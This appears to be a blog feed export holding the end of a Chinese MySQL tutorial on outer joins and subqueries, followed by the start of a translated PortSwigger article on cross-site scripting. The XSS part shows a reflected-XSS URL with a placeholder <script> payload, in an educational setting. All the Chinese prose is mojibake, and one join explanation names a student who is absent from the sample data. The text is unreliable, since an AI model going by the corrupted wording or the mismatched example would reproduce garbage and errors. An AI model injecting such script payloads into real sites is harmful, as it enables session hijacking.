class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå­¦ç”Ÿè¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;æå››&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;ç‹äº”&#x27;</span>,<span class="number">24</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;èµµå…­&#x27;</span>,<span class="number">23</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Jack&#x27;</span>,<span class="number">22</span>,<span class="number">1009</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>å·¦ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢</p>
</li>
</ol>
<p>å·¦(å¤–)è¿æ¥çš„ç»“æœåŒ…æ‹¬LEFT JOINå­å¥ä¸­æŒ‡å®šçš„å·¦è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œä»¥åŠæ‰€æœ‰æ»¡è¶³è¿æ¥æ¡ä»¶çš„è®°å½•ã€‚å¦‚æœå·¦è¡¨çš„æŸæ¡è®°å½•åœ¨å³è¡¨ä¸­ä¸å­˜åœ¨åˆ™åœ¨å³è¡¨ä¸­æ˜¾ç¤ºä¸ºç©ºã€‚</p>
<p>æŸ¥è¯¢æ¯ä¸ªç­çš„ç­çº§IDã€ç­çº§åç§°åŠè¯¥ç­çš„æ‰€æœ‰å­¦ç”Ÿçš„åå­— MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œæ•ˆæœå±•ç¤º</p>
<p><img src="/posts/c826a854//1aa93ef85390eaa0e11bbb16fefeedb6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><font class="notice">å±•ç¤ºç»“æœåˆ†æï¼š<br>
1ã€åˆ†åˆ«æ‰¾å‡ºJavaç­ã€C++ç­ã€Pythonç­çš„å­¦ç”ŸÂ <br>2ã€å³è¡¨çš„Jackä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶æ•…å…¶æ²¡æœ‰å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­Â <br>3ã€è™½ç„¶å·¦è¡¨çš„PHPç­æ²¡æœ‰å­¦ç”Ÿï¼Œä½†æ˜¯ä»»ç„¶æ˜¾ç¤ºäº†PHPçš„ä¿¡æ¯ï¼›ä½†æ˜¯ï¼Œå®ƒå¯¹åº”çš„å­¦ç”Ÿåå­—ä¸ºNULL</font></p>
<ol start="2">
<li class="lvl-3">
<p>å³ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢</p>
</li>
</ol>
<p>å³(å¤–)è¿æ¥çš„ç»“æœåŒ…æ‹¬RIGHT JOINå­å¥ä¸­æŒ‡å®šçš„å³è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œä»¥åŠæ‰€æœ‰æ»¡è¶³è¿æ¥æ¡ä»¶çš„è®°å½•ã€‚å¦‚æœå³è¡¨çš„æŸæ¡è®°å½•åœ¨å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œåˆ™å·¦è¡¨å°†è¿”å›ç©ºå€¼ã€‚</p>
<p>æŸ¥è¯¢æ¯ä¸ªç­çš„ç­çº§IDã€ç­çº§åç§°åŠè¯¥ç­çš„æ‰€æœ‰å­¦ç”Ÿçš„åå­— MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œæ•ˆæœå±•ç¤º</p>
<p><img src="/posts/c826a854//dd82b94cb3886aaa58c04a9cf89c38eb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><font class="notice">å±•ç¤ºç»“æœåˆ†æï¼š<br><br>
1ã€åˆ†åˆ«æ‰¾å‡ºJavaç­ã€C++ç­ã€Pythonç­çš„å­¦ç”Ÿ<br><br>
2ã€å·¦è¡¨çš„PHPç­ä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶æ•…å…¶æ²¡æœ‰å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­<br><br>
3ã€è™½ç„¶å³è¡¨çš„jackæ²¡æœ‰å¯¹åº”ç­çº§ï¼Œä½†æ˜¯ä»»ç„¶æ˜¾ç¤ºç‹è·ƒè·ƒçš„ä¿¡æ¯ï¼›ä½†æ˜¯ï¼Œå®ƒå¯¹åº”çš„ç­çº§ä»¥åŠç­çº§ç¼–å·å‡ä¸ºNULL</font></p>
<h2 id="å­æŸ¥è¯¢">å­æŸ¥è¯¢</h2>
<p>å­æŸ¥è¯¢æ˜¯æŒ‡ä¸€ä¸ªæŸ¥è¯¢è¯­å¥åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥å†…éƒ¨çš„æŸ¥è¯¢ï¼›è¯¥æŸ¥è¯¢è¯­å¥å¯ä»¥åµŒå¥—åœ¨ä¸€ä¸ª SELECTã€SELECTâ€¦INTOã€INSERTâ€¦INTOç­‰è¯­å¥ä¸­ã€‚åœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œå­æŸ¥è¯¢ä¸­çš„è¯­å¥ï¼Œå†å°†è¿”å›çš„ç»“æœä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„è¿‡æ»¤æ¡ä»¶ã€‚åœ¨å­æŸ»è¯¢ä¸­é€šå¸¸å¯ä»¥ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦å’ŒINã€EXISTSã€ANYã€ALLç­‰å…³é”®å­—ã€‚</p>
<p>å‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºç­çº§è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå­¦ç”Ÿè¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1005</span>,<span class="string">&#x27;Android&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;æå››&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;ç‹äº”&#x27;</span>,<span class="number">24</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;èµµå…­&#x27;</span>,<span class="number">23</span>,<span class="number">1004</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;å°æ˜&#x27;</span>,<span class="number">21</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;å°çº¢&#x27;</span>,<span class="number">26</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;å°äº®&#x27;</span>,<span class="number">27</span>,<span class="number">1002</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>å¸¦æ¯”è¾ƒè¿ç®—ç¬¦çš„æŸ¥è¯¢</p>
</li>
</ol>
<p>æ¯”è¾ƒè¿ç®—ç¬¦å‰é¢æˆ‘ä»¬æåˆ°è¿‡å¾—ï¼Œå°±æ˜¯&gt;ã€&lt;ã€=ã€&gt;=ã€&lt;=ã€!=ç­‰</p>
<p>æŸ¥è¯¢å¼ ä¸‰åŒå­¦æ‰€åœ¨ç­çº§çš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid=(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;å¼ ä¸‰&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢æ¯”å¼ ä¸‰åŒå­¦æ‰€åœ¨ç­çº§ç¼–å·è¿˜å¤§çš„ç­çº§çš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid&gt;(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;å¼ ä¸‰&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>å¸¦EXISTSå…³é”®å­—çš„æŸ¥è¯¢</p>
</li>
</ol>
<p>EXISTSå…³é”®å­—åé¢çš„å‚æ•°å¯ä»¥æ˜¯ä»»æ„ä¸€ä¸ªå­æŸ¥è¯¢ï¼Œ å®ƒä¸äº§ç”Ÿä»»ä½•æ•°æ®åªè¿”å›TRUEæˆ–FALSEã€‚å½“è¿”å›å€¼ä¸ºTRUEæ—¶å¤–å±‚æŸ¥è¯¢æ‰ä¼š æ‰§è¡Œ</p>
<p>å‡å¦‚ç‹äº”åŒå­¦åœ¨å­¦ç”Ÿè¡¨ä¸­åˆ™ä»ç­çº§è¡¨æŸ¥è¯¢æ‰€æœ‰ç­çº§ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;ç‹äº”&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>å¸¦ANYå…³é”®å­—çš„å­æŸ¥è¯¢</p>
</li>
</ol>
<p>ANYå…³é”®å­—è¡¨ç¤ºæ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ä¸ªæ¡ä»¶å°±è¿”å›ä¸€ä¸ªç»“æœä½œä¸ºå¤–å±‚æŸ¥è¯¢æ¡ä»¶ã€‚</p>
<p>æŸ¥è¯¢æ¯”ä»»ä¸€å­¦ç”Ÿæ‰€å±ç­çº§å·è¿˜å¤§çš„ç­çº§ç¼–å· MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cid</span> &gt; <span class="title">any</span> (<span class="title">select</span> <span class="title">classid</span> <span class="title">from</span> <span class="title">student</span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>å¸¦ALLå…³é”®å­—çš„å­æŸ¥è¯¢</p>
</li>
</ol>
<p>ALLå…³é”®å­—ä¸ANYæœ‰ç‚¹ç±»ä¼¼ï¼Œåªä¸è¿‡å¸¦ALLå…³é”®å­—çš„å­æŸ»è¯¢è¿”å›çš„ç»“æœéœ€åŒæ—¶æ»¡è¶³æ‰€æœ‰å†…å±‚æŸ»è¯¢æ¡ä»¶ã€‚</p>
<p>æŸ¥è¯¢æ¯”æ‰€æœ‰å­¦ç”Ÿæ‰€å±ç­çº§å·è¿˜å¤§çš„ç­çº§ç¼–å· MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cid</span> &gt; <span class="title">all</span> (<span class="title">select</span> <span class="title">classid</span> <span class="title">from</span> <span class="title">student</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>å…³äºå¤–é”®</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://blog.csdn.net/weixin_45851945/article/details/114287877">MySQL æœ‰è¿™ä¸€ç¯‡å°±å¤Ÿï¼ˆå‘•å¿ƒç‹‚æ•²37kå­—ï¼Œåªä¸ºåšå›ä¸€ç‚¹èµï¼ï¼ï¼ï¼‰</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€PortSwiggerå­¦é™¢ã€‘è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰</title>
    <url>/posts/cded1aa8/</url>
    <content><![CDATA[<h2 id="è·¨ç«™è„šæœ¬">è·¨ç«™è„šæœ¬</h2>
<h2 id="ä»€ä¹ˆæ˜¯è·¨ç«™è„šæœ¬-XSS-ï¼Ÿ">ä»€ä¹ˆæ˜¯è·¨ç«™è„šæœ¬ (XSS)ï¼Ÿ</h2>
<p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆåˆç§° XSSï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…ç ´åç”¨æˆ·ä¸æœ‰æ¼æ´çš„åº”ç”¨ç¨‹åºä¹‹é—´çš„äº¤äº’ã€‚å®ƒå…è®¸æ”»å‡»è€…è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨å°†ä¸åŒç½‘ç«™ç›¸äº’éš”ç¦»ã€‚è·¨ç«™è„šæœ¬æ¼æ´é€šå¸¸å…è®¸æ”»å‡»è€…ä¼ªè£…æˆå—å®³ç”¨æˆ·ï¼Œæ‰§è¡Œç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„ä»»ä½•æ“ä½œï¼Œå¹¶è®¿é—®ç”¨æˆ·çš„ä»»ä½•æ•°æ®ã€‚å¦‚æœå—å®³ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­æ‹¥æœ‰ç‰¹æƒè®¿é—®æƒé™ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰åŠŸèƒ½å’Œæ•°æ®ã€‚</p>
<h2 id="XSS-å¦‚ä½•å·¥ä½œï¼Ÿ">XSS å¦‚ä½•å·¥ä½œï¼Ÿ</h2>
<p>è·¨ç«™è„šæœ¬æ”»å‡»çš„åŸç†æ˜¯æ“çºµæœ‰æ¼æ´çš„ç½‘ç«™ï¼Œä½¿å…¶å‘ç”¨æˆ·è¿”å›æ¶æ„ JavaScriptã€‚å½“æ¶æ„ä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ—¶ï¼Œæ”»å‡»è€…å°±èƒ½å®Œå…¨ç ´åä»–ä»¬ä¸åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚</p>
<blockquote>
<p><strong>Labs</strong></p>
<p>å¦‚æœæ‚¨å·²ç»ç†Ÿæ‚‰äº† XSS æ¼æ´èƒŒåçš„åŸºæœ¬æ¦‚å¿µï¼Œåªæ˜¯æƒ³åœ¨ä¸€äº›ç°å®çš„ã€æ•…æ„æ˜“å—æ”»å‡»çš„ç›®æ ‡ä¸Šç»ƒä¹ åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸‹é¢çš„é“¾æ¥è®¿é—®æœ¬ä¸»é¢˜ä¸­çš„æ‰€æœ‰å®éªŒå®¤ã€‚</p>
<ul class="lvl-1">
<li class="lvl-2">
<p><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">View all XSS labs</a></p>
</li>
</ul>
</blockquote>
<h2 id="XSS-æ¦‚å¿µéªŒè¯">XSS æ¦‚å¿µéªŒè¯</h2>
<p>æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥æœ‰æ•ˆè´Ÿè½½ï¼Œä½¿è‡ªå·±çš„æµè§ˆå™¨æ‰§è¡Œä¸€äº›ä»»æ„ JavaScript æ¥ç¡®è®¤å¤§å¤šæ•°ç±»å‹çš„ XSS æ¼æ´ã€‚ä½¿ç”¨ alert() å‡½æ•°æ¥å®ç°è¿™ä¸€ç›®çš„æ—©å·²æˆä¸ºæƒ¯ä¾‹ï¼Œå› ä¸ºå®ƒç®€çŸ­ã€æ— å®³ï¼Œè€Œä¸”æˆåŠŸè°ƒç”¨æ—¶å¾ˆéš¾è¢«å¿½ç•¥ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬çš„å¤§å¤šæ•° XSS å®éªŒéƒ½æ˜¯åœ¨æ¨¡æ‹Ÿå—å®³è€…çš„æµè§ˆå™¨ä¸­è°ƒç”¨ alert() æ¥è§£å†³çš„ã€‚</p>
<p>ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Chrome æµè§ˆå™¨ï¼Œå°±ä¼šé‡åˆ°ä¸€ç‚¹å°éº»çƒ¦ã€‚ä»ç‰ˆæœ¬ 92 å¼€å§‹ï¼ˆ2021 å¹´ 7 æœˆ 20 æ—¥ï¼‰ï¼Œè·¨æº iframe æ— æ³•è°ƒç”¨ alert()ã€‚ç”±äºè¿™äº›æ¡†æ¶ç”¨äºæ„å»ºä¸€äº›æ›´é«˜çº§çš„ XSS æ”»å‡»ï¼Œå› æ­¤æœ‰æ—¶éœ€è¦ä½¿ç”¨å…¶ä»– PoC æœ‰æ•ˆè´Ÿè½½ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ¨èä½¿ç”¨ print() å‡½æ•°ã€‚å¦‚æœæ‚¨æœ‰å…´è¶£äº†è§£æœ‰å…³è¿™ä¸€å˜æ›´çš„æ›´å¤šä¿¡æ¯ï¼Œä»¥åŠæˆ‘ä»¬ä¸ºä»€ä¹ˆå–œæ¬¢ print()ï¼Œè¯·æŸ¥çœ‹æˆ‘ä»¬æœ‰å…³è¿™ä¸€ä¸»é¢˜çš„<a href="https://portswigger.net/research/alert-is-dead-long-live-print">åšå®¢</a>ã€‚</p>
<h2 id="XSS-æ”»å‡»æœ‰å“ªäº›ç±»å‹ï¼Ÿ">XSS æ”»å‡»æœ‰å“ªäº›ç±»å‹ï¼Ÿ</h2>
<p>XSS æ”»å‡»ä¸»è¦æœ‰ä¸‰ç§ç±»å‹ã€‚å®ƒä»¬æ˜¯ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åå°„ XSSï¼šæ¶æ„è„šæœ¬æ¥è‡ªå½“å‰ HTTP è¯·æ±‚ã€‚</p>
</li>
<li class="lvl-2">
<p>å­˜å‚¨å‹ XSSï¼šæ¶æ„è„šæœ¬æ¥è‡ªç½‘ç«™æ•°æ®åº“ã€‚</p>
</li>
<li class="lvl-2">
<p>åŸºäº DOM çš„ XSSï¼Œå³æ¼æ´å­˜åœ¨äºå®¢æˆ·ç«¯ä»£ç è€ŒéæœåŠ¡å™¨ç«¯ä»£ç ä¸­</p>
</li>
</ul>
<h2 id="åå°„å¼è·¨ç«™è„šæœ¬">åå°„å¼è·¨ç«™è„šæœ¬</h2>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šåå°„å¼è·¨ç«™è„šæœ¬ï¼Œæè¿°åå°„å¼ XSS æ”»å‡»çš„å½±å“ï¼Œå¹¶è¯´æ˜å¦‚ä½•æŸ¥æ‰¾åå°„å¼ XSS æ¼æ´ã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯åå°„å¼è·¨ç«™è„šæœ¬ï¼Ÿ">ä»€ä¹ˆæ˜¯åå°„å¼è·¨ç«™è„šæœ¬ï¼Ÿ</h3>
<p>åå°„å¼ XSS æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ä¸­æœ€ç®€å•çš„ä¸€ç§ã€‚å½“åº”ç”¨ç¨‹åºæ¥æ”¶ HTTP è¯·æ±‚ä¸­çš„æ•°æ®ï¼Œå¹¶ä»¥ä¸å®‰å…¨çš„æ–¹å¼å°†è¿™äº›æ•°æ®åŒ…å«åœ¨å³æ—¶å“åº”ä¸­æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªåå°„ XSS æ¼æ´çš„ç®€å•ç¤ºä¾‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=All+is+well.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: All is well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åº”ç”¨ç¨‹åºä¸ä¼šå¯¹æ•°æ®è¿›è¡Œä»»ä½•å…¶ä»–å¤„ç†ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ„å»ºç±»ä¼¼çš„æ”»å‡»ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœç”¨æˆ·è®¿é—®äº†æ”»å‡»è€…æ„å»ºçš„ URLï¼Œé‚£ä¹ˆæ”»å‡»è€…çš„è„šæœ¬å°±ä¼šåœ¨è¯¥ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„ä¼šè¯ä¸Šä¸‹æ–‡ä¸­ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚æ­¤æ—¶ï¼Œè„šæœ¬å¯ä»¥æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå¹¶æ£€ç´¢ç”¨æˆ·å¯ä»¥è®¿é—®çš„ä»»ä½•æ•°æ®ã€‚</p>
<p>å½“åº”ç”¨ç¨‹åºæ¥æ”¶ HTTP è¯·æ±‚ä¸­çš„æ•°æ®ï¼Œå¹¶ä»¥ä¸å®‰å…¨çš„æ–¹å¼å°†è¯¥æ•°æ®åŒ…å«åœ¨å³æ—¶å“åº”ä¸­æ—¶ï¼Œå°±ä¼šäº§ç”Ÿåå°„å¼è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆæˆ– XSSï¼‰ã€‚</p>
<p>å‡è®¾ä¸€ä¸ªç½‘ç«™æœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œå®ƒåœ¨ URL å‚æ•°ä¸­æ¥æ”¶ç”¨æˆ·æä¾›çš„æœç´¢è¯ï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/search?term=gift</span></span><br></pre></td></tr></table></figure>
<p>åº”ç”¨ç¨‹åºä¼šåœ¨å¯¹è¯¥ URL çš„å“åº”ä¸­å‘¼åº”æ‰€æä¾›çš„æœç´¢è¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å‡å®šåº”ç”¨ç¨‹åºä¸å¯¹æ•°æ®è¿›è¡Œä»»ä½•å…¶ä»–å¤„ç†ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„å»ºè¿™æ ·çš„æ”»å‡»ï¼š</p>
